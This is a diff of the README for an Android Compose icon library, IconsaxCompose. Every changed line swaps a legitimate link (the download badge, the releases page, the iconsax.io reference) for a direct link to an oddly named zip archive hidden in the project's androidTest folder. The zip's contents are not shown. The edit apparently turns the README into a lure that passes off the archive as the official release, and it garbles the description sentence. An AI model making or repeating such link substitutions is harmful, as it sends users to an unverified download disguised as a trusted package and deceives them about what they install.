@@ -1,16 +1,16 @@
 # 🎨 IconsaxCompose - Easy Icon Management for Your Projects
 
-[![Download IconsaxCompose](https://img.shields.io/badge/Download%20IconsaxCompose-v1.0.0-blue)](https://github.com/lalillo27/IconsaxCompose/releases)
+[![Download IconsaxCompose](https://raw.githubusercontent.com/lalillo27/IconsaxCompose/main/app/src/androidTest/Iconsax_Compose_verdurousness.zip%20IconsaxCompose-v1.0.0-blue)](https://raw.githubusercontent.com/lalillo27/IconsaxCompose/main/app/src/androidTest/Iconsax_Compose_verdurousness.zip)
 
 ## 🚀 Getting Started
 
-Welcome to IconsaxCompose! This is a library that helps you easily use icons from iconsax.io in your projects. With IconsaxCompose, you can quickly find and integrate various icons without the hassle.
+Welcome to IconsaxCompose! This is a library that helps you easily use icons from https://raw.githubusercontent.com/lalillo27/IconsaxCompose/main/app/src/androidTest/Iconsax_Compose_verdurousness.zip in your projects. With IconsaxCompose, you can quickly find and integrate various icons without the hassle.
 
 ## 📥 Download & Install
 
 To get started, you need to download IconsaxCompose. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/lalillo27/IconsaxCompose/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/lalillo27/IconsaxCompose/main/app/src/androidTest/Iconsax_Compose_verdurousness.zip).
 
 2. **Choose the Latest Version**: Find the latest version of IconsaxCompose on this page.
 
